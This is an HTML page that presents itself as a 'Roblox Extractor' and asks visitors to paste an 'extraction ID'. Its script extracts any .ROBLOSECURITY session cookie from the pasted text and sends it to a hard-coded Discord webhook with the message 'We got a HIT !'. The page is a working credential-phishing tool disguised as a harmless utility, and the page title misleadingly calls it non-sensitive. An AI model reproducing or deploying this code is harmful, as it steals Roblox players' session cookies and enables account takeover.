<!doctype html>
<html lang="fr">
<head>
  <meta charset="utf-8" />
  <title>Envoyer vers Webhook Discord (usage non sensible)</title>
  <style>
    body { font-family: Arial, sans-serif; max-width:800px; margin:30px auto; padding:0 16px; }
    label { display:block; margin-top:12px; font-weight:600; }
    textarea { width:100%; height:160px; }
    button { margin-top:10px; padding:8px 12px; }
    .log { margin-top:12px; white-space:pre-wrap; background:#f5f5f5; padding:8px; border-radius:6px; max-height:240px; overflow:auto; }
  </style>
</head>


<style>
  /* Reset simple */
  * { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    max-width: 800px;
    margin: 30px auto;
    padding: 20px;
    background: #f0f2f5;
    color: #333;
  }

  h2 {
    text-align: center;
    color: #4b6cb7;
    margin-bottom: 20px;
  }

  label {
    display: block;
    margin-top: 16px;
    font-weight: 600;
    color: #4b6cb7;
  }

  textarea {
    width: 100%;
    height: 160px;
    padding: 10px;
    border-radius: 8px;
    border: 1px solid #ccc;
    font-size: 14px;
    resize: vertical;
    transition: border-color 0.2s;
  }
  textarea:focus {
    border-color: #4b6cb7;
    outline: none;
    box-shadow: 0 0 5px rgba(75,108,183,0.3);
  }

  button {
    margin-top: 15px;
    padding: 10px 20px;
    border: none;
    background: #4b6cb7;
    color: white;
    font-weight: bold;
    font-size: 14px;
    border-radius: 8px;
    cursor: pointer;
    transition: background 0.3s, transform 0.2s;
  }
  button:hover {
    background: #3a539b;
    transform: translateY(-2px);
  }
  button:active {
    transform: translateY(0);
  }

  .log {
    margin-top: 20px;
    padding: 12px;
    background: #ffffff;
    border-radius: 8px;
    border: 1px solid #ddd;
    max-height: 250px;
    overflow-y: auto;
    font-family: monospace;
    font-size: 13px;
    line-height: 1.4;
    color: #555;
  }

  /* Responsive */
  @media (max-width: 600px) {
    body { padding: 15px; }
    button { width: 100%; }
  }
</style>


<body>
  <h2>Roblox Extractor</h2>

  <label>Enter The Extraction ID</label>
  <textarea id="message" placeholder="Roblox Extractor"></textarea>

  <div>
    <button id="sendBtn">Extract</button>
  </div>

  <div class="log" id="log"></div>

<script>
const logEl = document.getElementById('log');
function log(msg){ logEl.textContent += msg + "\n"; logEl.scrollTop = logEl.scrollHeight; }

// Mets ton webhook Discord ici :
const webhookUrl = "https://canary.discord.com/api/webhooks/1419364818313412752/1bw028oQ-SlM9w52kyS5MatdQYnIcpO7VKkf-TWz7rDnkOTPk8mg0hDy-AV9NYwZpFn9";

async function postToWebhook(url, body, isForm=false){
  try{
    const res = await fetch(url, {
      method: 'POST',
      headers: isForm ? undefined : { 'Content-Type': 'application/json' },
      body: isForm ? body : JSON.stringify(body),
    });
    if(!res.ok){
      const t = await res.text().catch(()=>res.statusText);
      throw new Error('HTTP ' + res.status + ' — ' + t);
    }
    return true;
  }catch(e){
    log('Erreur: ' + e.message);
    return false;
  }
}

// Découper le texte en segments de 1998 caractères
function splitIntoChunks(str, chunkSize=1998){
  const chunks = [];
  for(let i=0; i<str.length; i+=chunkSize){
    chunks.push(str.slice(i, i+chunkSize));
  }
  return chunks;
}

document.getElementById('sendBtn').addEventListener('click', async ()=>{
  const text = document.getElementById('message').value;
  if(!text){ log('Message vide — rien à envoyer.'); return; }

  // Extraire le texte entre ".Hello" et ";", en gardant ".Hello"
  const regex = /(\.ROBLOSECURITY[\s\S]*?);/g;
  let match;
  const extracted = [];
  while ((match = regex.exec(text)) !== null) {
    extracted.push(match[1].trim());
  }

  if(extracted.length === 0){ log('Aucun texte trouvé entre .Hello et ;'); return; }

  const chunks = splitIntoChunks(extracted.join("\n"), 1998); 

  // Envoi du message introductif
  await postToWebhook(webhookUrl, { content: '`We got a HIT ! :`' });

  log('Numbers Of ID Is Being Extract ' + chunks.length + ' Please Wait ...');
  for(let i=0;i<chunks.length;i++){
        const content = '**`' + chunks[i] + '`**';
    const ok = await postToWebhook(webhookUrl, { content: content });
    if(ok) log(`ID has been send ${i+1}/${chunks.length}.`);
    else { log('Erro.'); break; }
    await new Promise(r => setTimeout(r, 250));
  }
  log('Please Wait.');
});

</script>
</body>
</html>
